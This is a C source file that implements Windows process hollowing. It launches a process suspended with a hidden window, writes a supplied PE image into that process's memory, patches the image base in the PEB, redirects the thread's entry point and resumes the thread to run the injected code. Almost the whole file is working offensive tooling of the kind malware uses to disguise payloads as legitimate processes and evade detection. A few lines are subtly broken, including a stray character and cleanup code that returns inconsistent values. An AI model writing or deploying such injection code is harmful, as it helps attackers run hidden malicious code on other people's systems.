
#include "pe_inject.h"
#include <windows.h>
#include <winternl.h> 
#include <stdio.h>

#pragma comment(lib, "WindowsApp.lib")
#pragma warning (disable:4996)


#define PRINT_WINAPI_ERR(cApiName)	printf( "[!] %s Failed With Error: %d\n", cApiName, GetLastError())
#define GET_FILENAME(cPath)			(strrchr( cPath, '\\' ) ? strrchr( cPath, '\\' ) + 1 : cPath)

#define DELETE_HANDLE(H)						\
		if (H && H != INVALID_HANDLE_VALUE) {	\
			CloseHandle(H);						\
			H = NULL;							\
	}




BOOL FixMemPermissionsEx(IN HANDLE hProcess, IN ULONG_PTR pPeBaseAddress, IN PIMAGE_NT_HEADERS pImgNtHdrs, IN PIMAGE_SECTION_HEADER pImgSecHdr) {

	for (DWORD i = 0; i < pImgNtHdrs->FileHeader.NumberOfSections; i++) {

		DWORD	dwProtection		= 0x00,
				dwOldProtection		= 0x00;

		if (!pImgSecHdr[i].SizeOfRawData || !pImgSecHdr[i].VirtualAddress)
			continue;

		if (pImgSecHdr[i].Characteristics & IMAGE_SCN_MEM_WRITE)
			dwProtection = PAGE_WRITECOPY;

		if (pImgSecHdr[i].Characteristics & IMAGE_SCN_MEM_READ)
			dwProtection = PAGE_READONLY;

		if ((pImgSecHdr[i].Characteristics & IMAGE_SCN_MEM_WRITE) && (pImgSecHdr[i].Characteristics & IMAGE_SCN_MEM_READ))
			dwProtection = PAGE_READWRITE;

		if (pImgSecHdr[i].Characteristics & IMAGE_SCN_MEM_EXECUTE)
			dwProtection = PAGE_EXECUTE;

		if ((pImgSecHdr[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) && (pImgSecHdr[i].Characteristics & IMAGE_SCN_MEM_WRITE))
			dwProtection = PAGE_EXECUTE_WRITECOPY;

		if ((pImgSecHdr[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) && (pImgSecHdr[i].Characteristics & IMAGE_SCN_MEM_READ))
			dwProtection = PAGE_EXECUTE_READ;

		if ((pImgSecHdr[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) && (pImgSecHdr[i].Characteristics & IMAGE_SCN_MEM_WRITE) && (pImgSecHdr[i].Characteristics & IMAGE_SCN_MEM_READ))
			dwProtection = PAGE_EXECUTE_READWRITE;

		if (!VirtualProtectEx(hProcess, (PVOID)(pPeBaseAddress + pImgSecHdr[i].VirtualAddress), pImgSecHdr[i].SizeOfRawData, dwProtection, &dwOldProtection)) {
			return FALSE;
		}
	}

	return TRUE;
}


PBYTE PrintOutput(IN HANDLE StdOutRead) {



		DWORD	dwAvailableBytes	= 0x00;
		PBYTE	pBuffer				= 0x00;

		PeekNamedPipe(StdOutRead, NULL, NULL, NULL, &dwAvailableBytes, NULL);
		if (dwAvailableBytes == 0)
		    return NULL;

		pBuffer = (PBYTE)LocalAlloc(LPTR, (SIZE_T)dwAvailableBytes);
		if (!pBuffer)
			return NULL;

		if (!ReadFile(StdOutRead, pBuffer, dwAvailableBytes, NULL, NULL)) {
			LocalFree(pBuffer);
			return NULL;
		}

		return pBuffer;


}


BOOL CreateTheHollowedProcess(IN LPCSTR cRemoteProcessImage, IN OPTIONAL LPCSTR cProcessParms, OUT PPROCESS_INFORMATION pProcessInfo, OUT HANDLE* pStdInWrite, OUT HANDLE* pStdOutRead) {

	STARTUPINFO					StartupInfo			= { 0x00 };
	SECURITY_ATTRIBUTES			SecAttr				= { 0x00 };
	HANDLE						StdInRead			= NULL,		.
								StdInWrite			= NULL,		
								StdOutRead			= NULL,		
								StdOutWrite			= NULL;		
	LPCSTR						cRemoteProcessCmnd	= NULL;
	BOOL						bSTATE				= FALSE;

	RtlSecureZeroMemory(pProcessInfo, sizeof(PROCESS_INFORMATION));
	RtlSecureZeroMemory(&StartupInfo, sizeof(STARTUPINFO));
	RtlSecureZeroMemory(&SecAttr, sizeof(SECURITY_ATTRIBUTES));

	SecAttr.nLength					= sizeof(SECURITY_ATTRIBUTES);
	SecAttr.bInheritHandle			= TRUE;
	SecAttr.lpSecurityDescriptor	= NULL;

	if (!CreatePipe(&StdInRead, &StdInWrite, &SecAttr, 0x00)) {
		goto _FUNC_CLEANUP;
	}

	if (!CreatePipe(&StdOutRead, &StdOutWrite, &SecAttr, 0x00)) {
		goto _FUNC_CLEANUP;
	}

	StartupInfo.cb				= sizeof(STARTUPINFO);
	StartupInfo.dwFlags			|= (STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES);
	StartupInfo.wShowWindow		= SW_HIDE;
	StartupInfo.hStdInput		= StdInRead;
	StartupInfo.hStdOutput		= StartupInfo.hStdError = StdOutWrite;

	cRemoteProcessCmnd = LocalAlloc(LPTR, (strlen(cRemoteProcessImage) + (cProcessParms ? strlen(cProcessParms) : 0x00) + (sizeof(CHAR) * 2)));
	if (!cRemoteProcessCmnd) {
		goto _FUNC_CLEANUP;
	}

	sprintf(cRemoteProcessCmnd, cProcessParms == NULL ? "%s" : "%s %s", cRemoteProcessImage, cProcessParms == NULL ? "" : cProcessParms);
	if (!CreateProcessA(NULL, cRemoteProcessCmnd, &SecAttr, NULL, TRUE, (CREATE_SUSPENDED | CREATE_NEW_CONSOLE), NULL, NULL, &StartupInfo, pProcessInfo)) {
		goto _FUNC_CLEANUP;
	}


	*pStdInWrite = StdInWrite;
	*pStdOutRead = StdOutRead;

	bSTATE = TRUE;

_FUNC_CLEANUP:
	if (cRemoteProcessCmnd)
		LocalFree(cRemoteProcessCmnd);
	
	DELETE_HANDLE(StdInRead);
	DELETE_HANDLE(StdOutWrite);
	return TRUE;
}



BOOL ReplaceBaseAddressImage(IN HANDLE hProcess, IN ULONG_PTR uPeBaseAddress, IN ULONG_PTR Rdx) {

	ULONG_PTR	uRemoteImageBaseOffset	= 0x00,
				uRemoteImageBase		= 0x00;

	SIZE_T		NumberOfBytesRead		= 0x00,
				NumberOfBytesWritten	= 0x00;



	uRemoteImageBaseOffset = (PVOID)(Rdx + offsetof(PEB, Reserved3[1]));




	if (!WriteProcessMemory(hProcess, (PVOID)uRemoteImageBaseOffset, &uPeBaseAddress, sizeof(PVOID), &NumberOfBytesWritten) || sizeof(PVOID) != NumberOfBytesWritten) {
		return FALSE;
	}


	return TRUE;
}





PBYTE RemotePeExec(IN PBYTE pPeBuffer, IN LPCSTR cRemoteProcessImage, IN OPTIONAL LPCSTR cProcessParms) {

	if (!pPeBuffer || !cRemoteProcessImage)
		return FALSE;

	PROCESS_INFORMATION		ProcessInfo				= { 0x00 };
	CONTEXT					Context					= { .ContextFlags = CONTEXT_ALL };
	HANDLE					StdInWrite				= NULL,		
							StdOutRead				= NULL;		
	PBYTE					pRemoteAddress			= NULL;
	PIMAGE_NT_HEADERS		pImgNtHdrs				= NULL;
	PIMAGE_SECTION_HEADER	pImgSecHdr				= NULL;
	SIZE_T					NumberOfBytesWritten	= NULL;
	BOOL					bSTATE					= FALSE;

	if (!CreateTheHollowedProcess(cRemoteProcessImage, cProcessParms, &ProcessInfo, &StdInWrite, &StdOutRead))
		goto _FUNC_CLEANUP;

	if (!ProcessInfo.hProcess || !ProcessInfo.hThread)
		goto _FUNC_CLEANUP;



	pImgNtHdrs = (PIMAGE_NT_HEADERS)((ULONG_PTR)pPeBuffer + ((PIMAGE_DOS_HEADER)pPeBuffer)->e_lfanew);
	if (pImgNtHdrs->Signature != IMAGE_NT_SIGNATURE) {
		goto _FUNC_CLEANUP;
	}

	if (!(pRemoteAddress = VirtualAllocEx(ProcessInfo.hProcess, (LPVOID)pImgNtHdrs->OptionalHeader.ImageBase, (SIZE_T)pImgNtHdrs->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE))) {
		goto _FUNC_CLEANUP;
	}


	if (pRemoteAddress != (LPVOID)pImgNtHdrs->OptionalHeader.ImageBase) {
		goto _FUNC_CLEANUP;
	}


	if (!WriteProcessMemory(ProcessInfo.hProcess, pRemoteAddress, pPeBuffer, pImgNtHdrs->OptionalHeader.SizeOfHeaders, &NumberOfBytesWritten) || pImgNtHdrs->OptionalHeader.SizeOfHeaders != NumberOfBytesWritten) {
		goto _FUNC_CLEANUP;
	}


	pImgSecHdr = IMAGE_FIRST_SECTION(pImgNtHdrs);
	for (int i = 0; i < pImgNtHdrs->FileHeader.NumberOfSections; i++) {


		if (!WriteProcessMemory(ProcessInfo.hProcess, (PVOID)(pRemoteAddress + pImgSecHdr[i].VirtualAddress), (PVOID)(pPeBuffer + pImgSecHdr[i].PointerToRawData), pImgSecHdr[i].SizeOfRawData, &NumberOfBytesWritten) || pImgSecHdr[i].SizeOfRawData != NumberOfBytesWritten) {
			goto _FUNC_CLEANUP;
		}
	}


	if (!GetThreadContext(ProcessInfo.hThread, &Context)) {
		goto _FUNC_CLEANUP;
	}

	if (!ReplaceBaseAddressImage(ProcessInfo.hProcess, pRemoteAddress, Context.Rdx)) {
		goto _FUNC_CLEANUP;
	}

	if (!FixMemPermissionsEx(ProcessInfo.hProcess, pRemoteAddress, pImgNtHdrs, pImgSecHdr))
		goto _FUNC_CLEANUP;


	Context.Rcx = (LPVOID)(pRemoteAddress + pImgNtHdrs->OptionalHeader.AddressOfEntryPoint);
	if (!SetThreadContext(ProcessInfo.hThread, &Context)) {
		goto _FUNC_CLEANUP;
	}


	if (ResumeThread(ProcessInfo.hThread) == ((DWORD)-1)) {
		goto _FUNC_CLEANUP;
	}

	WaitForSingleObject(ProcessInfo.hProcess, INFINITE);	

	PBYTE output = PrintOutput(StdOutRead);
	return output;

	bSTATE = TRUE;

_FUNC_CLEANUP:
	DELETE_HANDLE(StdInWrite);
	DELETE_HANDLE(StdOutRead);
	DELETE_HANDLE(ProcessInfo.hProcess);
	DELETE_HANDLE(ProcessInfo.hThread);
	return output;
}

